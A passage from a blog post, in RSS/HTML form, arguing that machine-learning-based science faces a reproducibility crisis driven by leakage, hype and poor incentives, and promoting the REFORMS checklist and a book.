seem to put much more effort into establishing best practices and critically reviewing previously published work. About 650 papers across all fields are affected, which we hypothesize is a vast underestimate — when researchers look for leakage systematically, in many fields they find that the </span><em>majority</em><span> of sampled studies commit the error of leakage.</span></p><p><span>Leakage is one of many reasons for reproducibility failures. There are widespread </span><a href="https://reforms.cs.princeton.edu/appendix3.html" rel="">shortcomings</a><span> in every step of ML-based science, from data collection to preprocessing and reporting results. Problems that might lead to irreproducibility include improper comparisons to baselines, unrepresentative samples, results being sensitive to specific modeling choices, and not reporting model uncertainties. There is also the basic problem of researchers failing to publish their code and data, precluding reproducibility. For example, Gabelica et al. </span><a href="https://pubmed.ncbi.nlm.nih.gov/35654271/" rel="">examined</a><span> 333 open-access journals indexed on BioMed Central in January 2019 and found that out of the 1,800 papers that pledged to share data upon request, 93% did not do so.</span></p><p><strong>The roots run deep</strong></p><p><span>Even before ML, many scientific fields have been facing reproducibility and replicability crises. The root causes include the publish-or-perish culture in science, the strong bias for publishing positive results (and the near-impossibility of publishing negative results), the lack of incentives for debunking faulty studies, and the lack of consequences for publishing shoddy work. For example, faulty papers are almost never retracted. Peers don’t even seem to notice replication failures — after a paper fails to replicate, </span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC10460510/" rel="">only 3%</a><span> of citing articles cited the replication attempt.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-1-145256582" target="_self" rel="">1</a></span><span> Science communicators love to claim that science self-corrects, but self-correction is practically nonexistent in our experience.</span></p><p>All of these cultural factors are also present in ML-based science. But ML introduces a bunch of additional reasons why we should be skeptical of published results. Performance evaluation is notoriously tricky and many aspects of it, such as uncertainty quantification, are unresolved research areas. Also, ML code tends to vastly more complex and less standardized than traditional statistical modeling. Since it is not peer reviewers’ job to review code, coding errors are rarely discovered.</p><p><span>But we think the biggest reason for the poor quality of research is pervasive hype, resulting in the lack of a skeptical mindset among researchers, which is a cornerstone of good scientific practice. We’ve observed that when researchers have overoptimistic expectations, and their ML model performs poorly, they assume that they did something wrong and tweak the model, when in fact they should strongly consider the possibility that they have run up against inherent </span><a href="https://msalganik.github.io/cos597E-soc555_f2020/" rel="">limits to predictability</a><span>. Conversely, they tend to be credulous when their model performs well, when in fact they should be on high alert for leakage or other flaws. And if the model performs better than expected, they assume that it has discovered patterns in the data that no human could have thought of, and the myth of AI as an alien intelligence makes this explanation seem readily plausible.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png" width="373" height="236.5787037037037" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:822,&quot;width&quot;:1296,&quot;resizeWidth&quot;:373,&quot;bytes&quot;:83688,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F877ad57f-f2fc-4b70-9f03-a4bd52e490a7_1296x822.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>This is a feedback loop. Overoptimism fuels flawed research which further misleads other researchers in the field about what they should and shouldn’t expect AI to be able to do. In fact, we’ve encountered extreme versions of this in private correspondence with frustrated researchers: since flawed research goes uncorrected, it becomes literally impossible to publish good research since it will result in models that don’t beat the “state of the art”.</p><p><span>The more powerful and more black-box the tool, the more the potential for errors and overconfidence. The replication crises in psychology, medicine, etc. were the result of misapplication of plain old statistics. Given how relatively new ML is, our guess is that the reproducibility crisis in ML-based science will get worse for a while before it starts to get better. And now scientists are embracing large language models and generative AI, which open up many new pitfalls such as the </span><a href="https://www.nature.com/articles/s41586-024-07146-0" rel="">illusion of understanding</a><span>.</span></p><p><strong>Glimmers of hope</strong></p><p>One good thing about ML-based science is that it usually involves only data analysis, not experimenting on people. So other researchers should in principle be able to download a paper’s code and data and check whether they can reproduce the reported results. They can also review the code for any errors or problematic choices. This is time consuming, but much less so than replicating a study in psychology or medicine, which is typically almost as costly as the original study.</p><p>Another good thing is that the vast majority of errors can be avoided if the researchers know what to look out for. In contrast, mitigations for the replication crisis in statistical science, such as pre-registration, have a much more spotty track record of effectiveness.</p><p><span>So we think that the problem can be greatly mitigated by a culture change where researchers systematically exercise more care in their work and reproducibility studies are incentivized. The ML </span><em>methods</em><span> community has already moved in this direction via the </span><a href="https://www.simonsfoundation.org/event/reproducible-research-and-the-common-task-method/" rel="">common task method</a><span> (which is decades old) and the </span><a href="https://arxiv.org/abs/2003.12206" rel="">reproducibility challenge</a><span> (which is more recent), but this has not yet happened in ML-based science, that is, in disciplines like medicine or psychology that use ML models to advance knowledge in their respective fields.</span></p><p><span>We have led a few efforts to change this. First, our leakage paper has had an impact. It has been used by researchers to clarify how they build models and document and demonstrate the </span><a href="https://sportrxiv.org/index.php/server/preprint/view/191/351" rel="">absence of leakage</a><span>. It has been used by researchers trying to find leakage in </span><a href="https://arxiv.org/pdf/2401.14497" rel="">published work</a><span>. It has also been used as a way to underscore the importance of studying leakage and coming up with </span><a href="https://www.nature.com/articles/s41559-023-02162-1" rel="">discipline-specific</a><span> </span><a href="https://www.sciencedirect.com/science/article/pii/S0928098723001926" rel="">guidelines</a><span>.</span></p><p><span>Beyond leakage, we led a group of 19 researchers across computer science, data science, social sciences, mathematics, and biomedical research to develop the </span><a href="https://reforms.cs.princeton.edu/" rel="">REFORMS</a><span> checklist for ML-based science. It is a 32-item checklist that can help researchers catch eight kinds of common pitfalls in ML-based science, of which leakage is only one. It was recently </span><a href="https://www.science.org/doi/epdf/10.1126/sciadv.adk3452" rel="">published</a><span> in Science Advances. Of course, checklists by themselves won’t help if there isn’t a culture change, but based on the reception so far, we are cautiously optimistic.</span></p><p><strong>Concluding thoughts</strong></p><p>Our point isn’t that AI is useless to scientists. We ourselves frequently use AI as a tool, even in our research that’s not about AI. The key word is tool. AI is not a revolution. It is not a replacement for human understanding — to think so is to miss the point of science. AI does not offer a shortcut to the hard work and frustration inherent to research. AI is not an oracle and cannot see the future.</p><p><span>Unfortunately, most scientific fields have succumbed to AI hype, leading to a suspension of common sense. For example, a line of research in political science claimed to predict the onset of civil war with an accuracy</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-2-145256582" target="_self" rel="">2</a></span><span> of well over 90%, a number that should sound facially impossible. (It </span><a href="https://reproducible.cs.princeton.edu/#civil-war" rel="">turned out</a><span> to be leakage, which is what got us interested in this whole line of research.)</span></p><p><span>We are at an interesting moment in the history of science. Look at these graphs showing the adoption of AI in various fields:</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-3-145256582" target="_self" rel="">3</a></span></p><p><span>These hockey stick graphs are not good news. They should be terrifying. Adopting AI requires changes to scientific epistemology.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-4-145256582" href="https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool#footnote-4-145256582" target="_self" rel="">4</a></span><span> No scientific field has the capacity to accomplish this on a timescale of a couple of years. This is not what happens when a tool or method is adopted organically. It happens when scientists jump on a trend to get funding. Given the level of hype, scientists don’t need </span><em>additional</em><span> incentives to adopt AI. That means AI-for-science funding programs are probably making things worse. We doubt the avalanche of flawed research can be stopped, but if at least a fraction of AI-for-science funding were diverted to better training, critical inquiry, meta-science, reproducibility, and other quality-control efforts, the havoc can be minimized.</span></p><p><span>Our book </span><em>AI Snake Oil</em><span> is now available to preorder. If you have enjoyed our blog and would like to support our work, please preorder via </span><a href="https://substack.com/redirect/f0945e82-44e2-4998-9535-cee6fe9f0fa5?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Amazon</a><span>, </span><a href="https://substack.com/redirect/fd84f1c5-276b-488f-b91b-3cc7f32821ba?j=eyJ1IjoiYmd4a3MifQ.EjRMsvQe8Xc2mF1xAwL5aBabUU37X2wfP2-gBTgHzJM" rel="">Bookshop</a><span>, or your favorite bookseller.</span></p></div></div>]]></description>
        </item>
    </channel>
</rss>